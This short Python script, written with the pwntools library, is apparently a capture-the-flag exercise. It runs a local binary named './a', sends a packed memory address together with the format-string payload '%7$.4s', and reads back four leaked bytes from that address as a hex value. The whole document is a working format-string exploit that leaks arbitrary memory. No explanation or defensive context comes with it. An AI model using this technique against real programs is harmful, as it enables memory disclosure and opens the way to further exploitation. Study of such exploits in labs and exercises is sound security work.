from pwn import *

p = process('./a')
p.sendline(p32(0x0804a024) + '[%7$.4s]')
p.recvuntil('[')
value = u32(p.recv(4))
print hex(value)
